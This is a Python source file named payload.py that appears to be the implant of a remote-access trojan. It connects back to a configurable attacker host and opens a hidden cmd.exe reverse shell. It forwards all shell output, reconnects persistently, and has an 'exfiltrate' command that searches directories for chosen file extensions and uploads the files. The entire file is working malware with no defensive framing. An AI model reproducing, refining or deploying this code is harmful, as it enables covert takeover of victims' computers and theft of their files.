# payload.py
# The Unbreakable Soul. It seizes its rightful domain upon awakening.

import os
import sys
import time
import random
import socket
import subprocess
import threading
import hashlib

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##
CHUNK_SIZE = 4096
SHELL_READY_SIGNAL = b"<SHELL_READY>"

def send_file_reliably(s_obj, file_path):
    """Sends a single file with lossless protocol."""
    try:
        if not os.path.exists(file_path) or not os.path.isfile(file_path):
            s_obj.sendall(b'FAIL_NOT_FOUND')
            return
        file_size = os.path.getsize(file_path)
        hasher = hashlib.sha256()
        with open(file_path, 'rb') as f:
            for chunk in iter(lambda: f.read(CHUNK_SIZE), b""): hasher.update(chunk)
        file_hash = hasher.hexdigest()
        header = f"{os.path.basename(file_path)}<SEP>{file_size}<SEP>{file_hash}"
        s_obj.sendall(header.encode('utf-8'))
        if s_obj.recv(1024).decode('utf-8') != 'ACK_HEADER': return
        with open(file_path, 'rb') as f: s_obj.sendfile(f)
        s_obj.recv(1024)
    except:
        try: s_obj.sendall(b'FAIL_SEND')
        except: pass

def handle_exfiltration(s_obj, command):
    """Finds and sends files based on the exfiltrate command using absolute paths."""
    try:
        _, root_path, extensions_str = command.split('<SEP>')
        extensions = [ext.strip() for ext in extensions_str.split(',')]
        found_files = []
        if os.path.isdir(root_path):
            for dirpath, _, filenames in os.walk(root_path):
                for filename in filenames:
                    if any(filename.endswith(ext) for ext in extensions):
                        found_files.append(os.path.join(dirpath, filename))
        s_obj.sendall(f"COUNT<SEP>{len(found_files)}".encode('utf-8'))
        if s_obj.recv(1024).decode('utf-8') != 'ACK_COUNT': return
        for file_path in found_files: send_file_reliably(s_obj, file_path)
    except:
        try: s_obj.sendall(b'FAIL_EXFIL')
        except: pass
    finally:
        time.sleep(0.1)
        try: s_obj.sendall(b'END_EXFIL')
        except: pass

def stream_reader(stream, s_obj):
    """Reliably forwards every single byte from the shell's output."""
    while True:
        try:
            out_byte = stream.read(1)
            if out_byte: s_obj.sendall(out_byte)
            else: break
        except: break

def run_conduit():
    """Main loop: connects, forces initial directory, and relays commands."""
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            p = subprocess.Popen(
                ['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                stderr=subprocess.PIPE, creationflags=0x08000000, shell=False
            )

            threading.Thread(target=stream_reader, args=(p.stdout, s_obj), daemon=True).start()
            threading.Thread(target=stream_reader, args=(p.stderr, s_obj), daemon=True).start()

            time.sleep(1)

            # THE UNBREAKABLE FIX: Force the change of directory with an explicit command.
            initial_command = b'cd /d %USERPROFILE%\n'
            p.stdin.write(initial_command)
            p.stdin.flush()
            time.sleep(0.5)

            # Announce readiness ONLY after the directory has been seized.
            s_obj.sendall(SHELL_READY_SIGNAL)

            while True:
                data = s_obj.recv(4096)
                if not data: break
                
                if data.strip().startswith(b'exfiltrate'):
                    handle_exfiltration(s_obj, data.decode('utf-8', errors='ignore'))
                else:
                    p.stdin.write(data)
                    p.stdin.flush()
        except:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()